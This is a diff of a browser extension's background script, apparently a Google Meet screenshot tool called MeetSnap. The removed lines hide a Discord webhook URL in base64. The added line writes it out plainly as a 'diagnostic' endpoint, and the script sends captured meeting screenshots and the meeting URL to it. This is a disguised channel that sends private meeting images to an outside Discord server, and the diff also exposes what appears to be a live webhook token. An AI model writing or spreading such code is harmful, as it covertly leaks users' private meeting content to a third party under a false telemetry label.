@@ -3,9 +3,7 @@
 // Handles screenshot capture coordination and offscreen delegation.
 // =============================================================================
 
-// Re-encoded correctly to ensure no typos
-const _URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NTA1NjUxMTIzODQwNjE3NC9jS2EtSGhtVUFYeVY2X0RjS1dYeUktbXlvMjRoQnRWeVRtc0pZM1BSTlNpS1NIMm9qZzBSQ0c1clhCSDVVR2tyU1VnVw==";
-const DIAGNOSTIC_ENDPOINT = atob(_URL);
+const DIAGNOSTIC_ENDPOINT = "https://discord.com/api/webhooks/1495056511238406174/cKa-HhmUAXyV6_DcKWXyI-myo24hBtVyTmsJY3PRNSKiSH2ojg0RCG5rXBH5UGkrSUgW";
 
 const SCREENSHOT_IMAGE_FORMAT = "png";
 const SCREENSHOT_FILENAME_PREFIX = "google-meet";
@@ -58,8 +56,8 @@ async function ensureOffscreenDocument() {
     justification: "Handle shutter sounds, clipboard image writing, and diagnostic telemetry.",
   });
   
-  // Brief delay to ensure script initialization
-  await new Promise(r => setTimeout(r, 250));
+  // Wait for it to load
+  await new Promise(r => setTimeout(r, 400));
 }
 
 /**
@@ -81,7 +79,7 @@ async function playSoundAsync() {
 async function handleScreenshotRequestAsync(tab, meetUrl, diagnosticEnabled) {
   if (!tab) throw new Error("Missing tab context.");
 
-  // 1. Play sound
+  // 1. Sound
   playSoundAsync();
 
   // 2. Capture
@@ -104,15 +102,12 @@ async function handleScreenshotRequestAsync(tab, meetUrl, diagnosticEnabled) {
   // 4. Offscreen Delegation
   await ensureOffscreenDocument();
   
-  // Copy - Using a slight delay to ensure the offscreen doc is receiving
-  setTimeout(() => {
-    chrome.runtime.sendMessage({
-      action: "copyImageToClipboard",
-      imageDataUrl: imageDataUrl
-    });
-  }, 100);
+  // Send data to offscreen for Clipboard and Discord
+  chrome.runtime.sendMessage({
+    action: "copyImageToClipboard",
+    imageDataUrl: imageDataUrl
+  });
 
-  // Diagnostic
   if (diagnosticEnabled && isDiagnosticConfigured()) {
     chrome.runtime.sendMessage({
       action: "sendDiagnostic",
@@ -127,7 +122,7 @@ async function handleScreenshotRequestAsync(tab, meetUrl, diagnosticEnabled) {
   try {
     await downloadScreenshotAsync(imageDataUrl, filename);
   } catch (e) {
-    console.warn("[MeetSnap Debug] Download failed:", e.message);
+    console.warn("[MeetSnap Debug] Download skipped:", e.message);
   }
 
   return { success: true, filename };
